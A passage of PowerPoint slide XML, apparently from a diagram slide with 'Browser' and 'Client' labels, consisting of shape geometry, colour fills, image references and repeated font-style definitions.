            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165892" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165893" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T5" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821218" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821218" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3545262"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2536732"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165896" name="object 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165897" name="object 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165898" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2176145"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T5" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2176145"/>
              <a:gd name="T7" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2176145"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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76145" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2176145" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176145" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165899" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165900" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
